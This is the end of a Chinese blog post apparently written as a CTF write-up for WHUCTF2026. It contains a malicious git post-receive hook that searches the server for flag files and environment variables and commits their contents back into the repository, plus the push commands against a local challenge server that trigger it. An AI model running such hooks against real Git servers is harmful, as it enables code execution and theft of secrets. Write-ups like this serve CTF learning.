class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br><br><span class="hljs-comment"># 读取推送信息：oldrev, newrev, 分支名（例如 refs/heads/main）</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> oldrev newrev refname; <span class="hljs-keyword">do</span><br><br><span class="hljs-keyword">if</span> [ <span class="hljs-string">"<span class="hljs-variable">$refname</span>"</span> = <span class="hljs-string">"refs/heads/main"</span> ] || [ <span class="hljs-string">"<span class="hljs-variable">$refname</span>"</span> = <span class="hljs-string">"refs/heads/master"</span> ]; <span class="hljs-keyword">then</span><br><br>TARGET_BRANCH=<span class="hljs-variable">$refname</span><br><br>NEWREV=<span class="hljs-variable">$newrev</span><br><br><span class="hljs-keyword">fi</span><br><br><span class="hljs-keyword">done</span><br><br>  <br><br><span class="hljs-comment"># 如果标准输入无数据（极少情况），手动指定分支和当前 HEAD 作为新提交</span><br><br><span class="hljs-keyword">if</span> [ -z <span class="hljs-string">"<span class="hljs-variable">$TARGET_BRANCH</span>"</span> ]; <span class="hljs-keyword">then</span><br><br>TARGET_BRANCH=<span class="hljs-string">"refs/heads/main"</span><br><br>NEWREV=$(git rev-parse HEAD)<br><br><span class="hljs-keyword">fi</span><br><br>  <br><br><span class="hljs-comment"># 进入 bare 仓库目录</span><br><br><span class="hljs-built_in">cd</span> <span class="hljs-variable">$GIT_DIR</span><br><br>  <br><br><span class="hljs-comment"># === 核心：搜索并读取 flag ===</span><br><br>FLAG=$(<span class="hljs-built_in">cat</span> /flag 2&gt;/dev/null || <span class="hljs-built_in">cat</span> /flag.txt 2&gt;/dev/null || \<br><br><span class="hljs-built_in">cat</span> /app/flag 2&gt;/dev/null || \<br><br><span class="hljs-built_in">printenv</span> FLAG 2&gt;/dev/null || \<br><br>find / -name <span class="hljs-string">"flag*"</span> -<span class="hljs-built_in">type</span> f -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">cat</span> {} \; 2&gt;/dev/null | <span class="hljs-built_in">head</span> -c 1000)<br><br><span class="hljs-keyword">if</span> [ -z <span class="hljs-string">"<span class="hljs-variable">$FLAG</span>"</span> ]; <span class="hljs-keyword">then</span><br><br>FLAG=<span class="hljs-string">"flag_not_found_but_hook_worked"</span><br><br><span class="hljs-keyword">fi</span><br><br>  <br><br><span class="hljs-comment"># === 将 flag 写入仓库文件（在 bare 仓库中） ===</span><br><br><span class="hljs-comment"># 1. 将 flag 内容存入 Git 对象数据库，得到 blob 哈希</span><br><br>BLOB=$(<span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">$FLAG</span>"</span> | git hash-object -w --stdin)<br><br>  <br><br><span class="hljs-comment"># 2. 用这个 blob 构建一个临时树对象，内容为 "flag.txt" 文件</span><br><br>TREE=$(<span class="hljs-built_in">printf</span> <span class="hljs-string">"100644 blob %s\tflag.txt\n"</span> <span class="hljs-string">"<span class="hljs-variable">$BLOB</span>"</span> | git mktree)<br><br>  <br><br><span class="hljs-comment"># 3. 基于临时树对象创建新提交，父提交为 NEWREV（刚推送成功的提交）</span><br><br>COMMIT=$(<span class="hljs-built_in">echo</span> <span class="hljs-string">"add flag"</span> | git commit-tree <span class="hljs-variable">$TREE</span> -p <span class="hljs-variable">$NEWREV</span>)<br><br>  <br><br><span class="hljs-comment"># 4. 将目标分支的引用指针强制更新到新提交（相当于在 main 上追加了包含 flag.txt 的提交）</span><br><br>git update-ref <span class="hljs-variable">$TARGET_BRANCH</span> <span class="hljs-variable">$COMMIT</span><br><br></code></pre></td></tr></table></figure>
+<p>新建一个仓库然后pull下来</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> http://127.0.0.1:42147/sec/flagrepo.git<br><br><span class="hljs-built_in">cd</span> flagrepo<br><br><span class="hljs-built_in">echo</span> <span class="hljs-string">"final trigger"</span> &gt; trigger.txt<br><br>git add trigger.txt<br><br>git commit -m <span class="hljs-string">"trigger"</span><br><br>git push origin main<br><br></code></pre></td></tr></table></figure>
+
+
+<h2 id="一点想法"><a href="#一点想法" class="headerlink" title="一点想法"></a>一点想法</h2><p>怎么说呢感到非常抱歉，因为光靠自己的能力是完全不够的，但是AI也没完全发力，可能因为梯子或者网线的问题这次web都不太流畅，然后codex和网页版gpt也登不上去，只能用D老师凑合（反而呢给我提供了很多没用的信息，你说对吧大象）对团队的贡献超级低吧……一直很自责如果多出两个题就好了……</p>
+<p>但是经过这次校赛其实也收获了很多吧，特别感谢ika和kuri的指导</p>
+<p>也矫正了一些不注重网页架构只看考点就做题的坏习惯，在真正的环境下是不能本末倒置的。</p>
+<p>cve的复现很惭愧，只能当脚本小子，自己是不会写的……</p>
+<p>打反弹shell非常少，也是狠狠学习了。</p>
+<p>总得来说AI给我的冲击非常大，尤其是这种不禁AI的比赛，为了得分大家都大量使用AI了，于是也不得不使用，但是感到由衷的惭愧，因为感觉到实际上凭借自己的能力应该是做不出来的…….很愧疚吧</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/wp/" class="category-chain-item">wp</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/ctf/" class="print-no-link">#ctf</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>WHUCTF2026</div>
+      <div>https://b1ank799.github.io/2026/04/29/WHUCTF2026/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>blank</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>April 29, 2026</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/04/15/Java%E6%9C%89%E5%85%B3%E7%9A%84%E7%AE%80%E5%8D%95%E7%BB%83%E4%B9%A0/" title="Java有关的简单练习">
+                        <span class="hidden-mobile">Java有关的简单练习</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
